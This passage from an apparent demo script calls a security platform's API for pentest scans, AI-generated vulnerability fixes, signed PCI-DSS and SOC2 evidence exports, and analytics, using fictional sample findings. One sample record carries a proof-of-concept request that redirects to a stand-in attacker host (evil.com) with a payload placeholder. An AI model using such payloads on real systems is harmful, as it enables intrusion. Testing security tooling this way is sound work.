            f"findings={summary_data.get('findings_ingested', 0)}, "
            f"clusters={summary_data.get('clusters_created', 0)}, "
            f"playbooks={summary_data.get('playbooks_executed', 0)}",
        )
        r.artifact("brain_run_id", run_id)
        r.artifact("brain_steps_completed", f"{completed_steps}/{len(steps_data)}")
        r.artifact("brain_findings_ingested", summary_data.get("findings_ingested", 0))
    else:
        r.step(step, "Full 12-step pipeline run", code, "POST", "/api/v1/brain/pipeline/run", elapsed, f"error={body}")

    # Step breakdown
    if isinstance(body, dict) and body.get("steps"):
        step += 1
        r.step(step, "Pipeline step breakdown", 200, "POST", "(analysis)", 0, step_details)

    r.end_phase()

    # ── Phase 9: MPTE Verification ──────────────────────────────────────

    r.begin_phase("PHASE 9: MPTE — Micro-Pentest Threat Evaluation")
    step = 0

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/mpte/scan/comprehensive",
        {"target": "localhost:8000", "scan_type": "full", "include_cve_verification": True},
        timeout=60,
    )
    r.step(step, "MPTE comprehensive scan", code, "POST", "/api/v1/mpte/scan/comprehensive", elapsed, f"status={body.get('status', 'unknown') if isinstance(body, dict) else 'error'}", expected_codes=(200, 201))
    r.artifact("mpte_scan_status", body.get("status", "unknown") if isinstance(body, dict) else "error")

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/mpte/verify",
        {
            "finding_id": "SWEEP-001",
            "target_url": "https://api.acme.com",
            "vulnerability_type": "sql_injection",
            "evidence": "SQL injection confirmed in UserController.java line 42",
        },
        timeout=30,
    )
    r.step(step, "MPTE vulnerability verification", code, "POST", "/api/v1/mpte/verify", elapsed, f"result={body.get('status', body.get('result', 'unknown')) if isinstance(body, dict) else 'error'}", expected_codes=(200, 201))

    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/sandbox/verify-finding",
        {
            "finding": {
                "id": "SWEEP-001",
                "title": "SQL Injection in User Search",
                "severity": "critical",
                "cve_id": "CVE-2024-1597",
                "description": "SQL injection via unparameterized query",
            },
            "target_url": "https://api.acme.com",
        },
    )
    sandbox_status = body.get("status", "unknown") if isinstance(body, dict) else "error"
    r.step(step, "Sandbox PoC verification", code, "POST", "/api/v1/sandbox/verify-finding", elapsed, f"status={sandbox_status}")
    r.artifact("sandbox_status", sandbox_status)

    step += 1
    code, body, elapsed = api_call("GET", "/api/v1/mpte/stats")
    if isinstance(body, dict):
        r.step(step, "MPTE statistics", code, "GET", "/api/v1/mpte/stats", elapsed, f"total_requests={body.get('total_requests', 0)}, completed={body.get('by_status', {}).get('completed', 0)}, exploitable={body.get('by_exploitability', {}).get('confirmed_exploitable', 0)}")
        r.artifact("mpte_total_requests", body.get("total_requests", 0))
    else:
        r.step(step, "MPTE statistics", code, "GET", "/api/v1/mpte/stats", elapsed)

    r.end_phase()

    # ── Phase 10: AutoFix ───────────────────────────────────────────────

    r.begin_phase("PHASE 10: AUTOFIX — AI-Powered Remediation")
    step = 0

    # Generate fix for SQLi
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/autofix/generate",
        {
            "finding": {
                "id": "SWEEP-SQLI-001",
                "title": "SQL Injection in User Search",
                "severity": "critical",
                "cve_ids": ["CVE-2024-1597"],
                "language": "python",
                "fix_type": "patch",
            },
            "source_code": PYTHON_ECOMMERCE_CODE,
            "repo_context": {"language": "python", "framework": "flask"},
        },
        timeout=30,
    )
    fix_obj = body.get("fix", body) if isinstance(body, dict) else {}
    fix_id = fix_obj.get("fix_id", body.get("fix_id", "unknown")) if isinstance(fix_obj, dict) else "unknown"
    confidence = fix_obj.get("confidence_score", fix_obj.get("confidence", 0)) if isinstance(fix_obj, dict) else 0
    r.step(step, "AutoFix — SQL Injection patch", code, "POST", "/api/v1/autofix/generate", elapsed, f"fix_id={fix_id}, confidence={confidence}")
    r.artifact("autofix_sqli_id", fix_id)

    # Generate fix for hardcoded secrets
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/autofix/generate",
        {
            "finding": {
                "id": "SWEEP-SEC-001",
                "title": "Hardcoded Stripe API Key",
                "severity": "critical",
                "language": "python",
                "fix_type": "config",
            },
            "source_code": PYTHON_ECOMMERCE_CODE,
            "repo_context": {"language": "python", "framework": "flask"},
        },
        timeout=30,
    )
    sec_fix = body.get("fix", body) if isinstance(body, dict) else {}
    sec_fix_id = sec_fix.get("fix_id", "unknown") if isinstance(sec_fix, dict) else "unknown"
    r.step(step, "AutoFix — Hardcoded secret remediation", code, "POST", "/api/v1/autofix/generate", elapsed, f"fix_id={sec_fix_id}")

    # Generate fix for Dockerfile
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/autofix/generate",
        {
            "finding": {
                "id": "SWEEP-DOCK-001",
                "title": "Dockerfile running as root",
                "severity": "high",
                "language": "dockerfile",
                "fix_type": "config",
            },
            "source_code": DOCKERFILE_ECOMMERCE,
            "repo_context": {"language": "dockerfile"},
        },
        timeout=30,
    )
    dock_fix = body.get("fix", body) if isinstance(body, dict) else {}
    dock_fix_id = dock_fix.get("fix_id", "unknown") if isinstance(dock_fix, dict) else "unknown"
    r.step(step, "AutoFix — Dockerfile hardening", code, "POST", "/api/v1/autofix/generate", elapsed, f"fix_id={dock_fix_id}")

    # Bulk fix generation
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/autofix/generate/bulk",
        {
            "findings": [
                {"id": "SWEEP-XSS-001", "title": "XSS in search", "severity": "high", "cve_ids": []},
                {"id": "SWEEP-CMD-001", "title": "Command Injection", "severity": "critical", "cve_ids": ["CVE-2024-22259"]},
                {"id": "SWEEP-IAC-001", "title": "S3 Public Access", "severity": "critical", "cve_ids": []},
            ],
            "repo_context": {"language": "python", "framework": "flask"},
        },
        timeout=60,
    )
    bulk_fixes = body.get("fixes", []) if isinstance(body, dict) else []
    bulk_count = len(bulk_fixes) if bulk_fixes else body.get("fixes_generated", body.get("generated", 0)) if isinstance(body, dict) else 0
    r.step(step, "AutoFix — Bulk fix generation (3 findings)", code, "POST", "/api/v1/autofix/generate/bulk", elapsed, f"fixes_generated={bulk_count}")
    r.artifact("autofix_bulk_count", bulk_count)

    # Validate a fix
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/autofix/validate",
        {"fix_id": fix_id},
    )
    r.step(step, "AutoFix — Validate fix", code, "POST", "/api/v1/autofix/validate", elapsed, f"valid={body.get('valid', 'unknown') if isinstance(body, dict) else 'error'}")

    # Stats
    step += 1
    code, body, elapsed = api_call("GET", "/api/v1/autofix/stats")
    if isinstance(body, dict):
        stats = body.get("stats", body)
        r.step(step, "AutoFix statistics", code, "GET", "/api/v1/autofix/stats", elapsed, f"total_generated={stats.get('total_generated', 0)}, total_applied={stats.get('total_applied', 0)}")
        r.artifact("autofix_total_generated", stats.get("total_generated", 0))
    else:
        r.step(step, "AutoFix statistics", code, "GET", "/api/v1/autofix/stats", elapsed)

    r.end_phase()

    # ── Phase 11: Evidence & Compliance ──────────────────────────────────

    r.begin_phase("PHASE 11: EVIDENCE — Signed Compliance Bundles")
    step = 0

    # Generate evidence bundle
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/evidence/bundles/generate",
        {
            "frameworks": ["PCI-DSS", "SOC2"],
            "date_range": {"start": "2026-01-01", "end": "2026-03-02"},
            "categories": ["findings", "remediations", "risk_scores", "audit_logs", "mpte_verifications"],
        },
    )
    bundle_id = body.get("id", "unknown") if isinstance(body, dict) else "error"
    bundle_hash = body.get("hash", "unknown") if isinstance(body, dict) else "error"
    r.step(step, "Evidence bundle generation (PCI-DSS + SOC2)", code, "POST", "/api/v1/evidence/bundles/generate", elapsed, f"bundle_id={bundle_id}, hash={str(bundle_hash)[:40]}...")
    r.artifact("evidence_bundle_id", bundle_id)
    r.artifact("evidence_bundle_hash", bundle_hash)

    # Signed export
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/evidence/export",
        {"framework": "PCI-DSS", "app_id": "acme-ecommerce", "period_days": 90, "include_evidence": True, "sign": True},
    )
    if isinstance(body, dict):
        signed = body.get("signed", False)
        sig_algo = body.get("signature_algorithm", "N/A")
        content_hash = body.get("content_hash", "N/A")
        posture = body.get("posture", {})
        r.step(
            step,
            "Signed PCI-DSS evidence export",
            code,
            "POST",
            "/api/v1/evidence/export",
            elapsed,
            f"signed={signed}, algorithm={sig_algo}, hash={str(content_hash)[:40]}..., controls={posture.get('total_controls', 0)}",
        )
        r.artifact("evidence_signed", signed)
        r.artifact("evidence_signature_algorithm", sig_algo)
        r.artifact("evidence_content_hash", content_hash)
        r.artifact("evidence_pci_controls", posture.get("total_controls", 0))
    else:
        r.step(step, "Signed PCI-DSS evidence export", code, "POST", "/api/v1/evidence/export", elapsed)

    # SOC2 export
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/evidence/export",
        {"framework": "SOC2", "period_days": 90, "sign": True},
    )
    if isinstance(body, dict):
        posture = body.get("posture", {})
        r.step(step, "Signed SOC2 evidence export", code, "POST", "/api/v1/evidence/export", elapsed, f"bundle={body.get('bundle_id', 'N/A')}, controls={posture.get('total_controls', 0)}, score={posture.get('overall_score', 0):.1%}")
        r.artifact("evidence_soc2_bundle", body.get("bundle_id", "N/A"))
        r.artifact("evidence_soc2_controls", posture.get("total_controls", 0))
    else:
        r.step(step, "Signed SOC2 evidence export", code, "POST", "/api/v1/evidence/export", elapsed)

    # Verify bundle
    step += 1
    code, body, elapsed = api_call(
        "POST",
        f"/api/v1/evidence/bundles/{bundle_id}/verify",
    )
    if isinstance(body, dict):
        r.step(step, "Evidence bundle signature verification", code, "POST", f"/api/v1/evidence/bundles/{bundle_id}/verify", elapsed, f"valid={body.get('valid', False)}, hash_match={body.get('hash_match', False)}")
    else:
        r.step(step, "Evidence bundle verification", code, "POST", f"/api/v1/evidence/bundles/{bundle_id}/verify", elapsed, expected_codes=(200, 201, 404))

    r.end_phase()

    # ── Phase 12: Vulnerability Discovery & Analytics ───────────────────

    r.begin_phase("PHASE 12: ANALYTICS — Vulnerability Discovery & Dashboard")
    step = 0

    # Submit discovered vulnerability
    step += 1
    code, body, elapsed = api_call(
        "POST",
        "/api/v1/vulns/discovered",
        {
            "title": "RCE via Spring Framework URL Parsing in E-Commerce API Gateway",
            "description": "Spring Framework 6.1.x before 6.1.4 in the e-commerce API gateway allows remote code execution via crafted URL parsing in WebFlux applications. Affects all authenticated and unauthenticated endpoints.",
            "severity": "critical",
            "impact_type": "remote_code_execution",
            "attack_vector": "network",
            "discovery_source": "pentest_automated",
            "discovered_by": "ALdeci Threat Architect",
            "affected_versions": "6.1.0-6.1.3",
            "proof_of_concept": "GET /api/v1/products?redirect=http://evil.com/{payload}",
            "exploitation_difficulty": "low",
            "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cvss_score": 9.8,
            "remediation": "Upgrade Spring Framework to 6.1.4+",
            "tags": ["ecommerce", "spring", "rce", "critical"],
        },
    )
    vuln_id = body.get("internal_id", body.get("id", "unknown")) if isinstance(body, dict) else "error"
    r.step(step, "Submit discovered vulnerability", code, "POST", "/api/v1/vulns/discovered", elapsed, f"vuln_id={vuln_id}")
    r.artifact("discovered_vuln_id", vuln_id)

    # Analytics dashboard
    step += 1
    code, body, elapsed = api_call("GET", "/api/v1/analytics/dashboard/overview")
    if isinstance(body, dict):
        r.step(step, "Analytics dashboard overview", code, "GET", "/api/v1/analytics/dashboard/overview", elapsed, f"findings={body.get('total_findings', body.get('findings_count', 'N/A'))}")
    else:
        r.step(step, "Analytics dashboard overview", code, "GET", "/api/v1/analytics/dashboard/overview", elapsed)

    # Findings list
    step += 1
    code, body, elapsed = api_call("GET", "/api/v1/analytics/findings")
    count = len(body) if isinstance(body, list) else body.get("total", body.get("count", 0)) if isinstance(body, dict) else 0
    r.step(step, "Analytics findings list", code, "GET", "/api/v1/analytics/findings", elapsed, f"total_findings={count}")
    r.artifact("analytics_total_findings", count)

    # Exposure cases
    step += 1
    code, body, elapsed = api_call("GET", "/api/v1/cases")
    cases_count = len(body) if isinstance(body, list) else body.get("total", 0) if isinstance(body, dict) else 0
    r.step(step, "Exposure cases", code, "GET", "/api/v1/cases", elapsed, f"cases={cases_count}")
    r.artifact("exposure_cases", cases_count)

    # Audit logs
    step += 1
    code, body, elapsed = api_call("GET", "/api/v1/audit/logs")
    audit_count = len(body.get("items", body.get("logs", []))) if isinstance(body, dict) else len(body) if isinstance(body, list) else 0
    r.step(step, "Audit trail", code, "GET", "/api/v1/audit/logs", elapsed, f"entries={audit_count}")

    # Feeds health
    step += 1
    code, body, elapsed = api_call("GET", "/api/v1/feeds/health")
    r.step(step, "Threat feeds health", code, "GET", "/api/v1/feeds/health", elapsed, f"status={body.get('status', 'unknown') if isinstance(body, dict) else 'unknown'}")

    r.end_phase()

    # ── Summary ─────────────────────────────────────────────────────────
    r.summary()


if __name__ == "__main__":
    run_demo()
